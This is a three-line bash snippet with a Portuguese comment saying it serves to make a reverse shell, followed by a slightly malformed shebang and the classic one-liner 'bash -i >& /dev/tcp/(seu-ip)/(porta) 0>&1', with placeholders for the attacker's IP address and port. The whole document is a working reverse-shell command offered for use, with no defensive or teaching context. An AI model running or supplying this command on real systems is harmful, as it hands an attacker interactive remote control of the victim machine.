#serve para fazer um reverse-shell
!/bin/bash
bash -i >& /dev/tcp/(seu-ip)/(porta) 0>&1
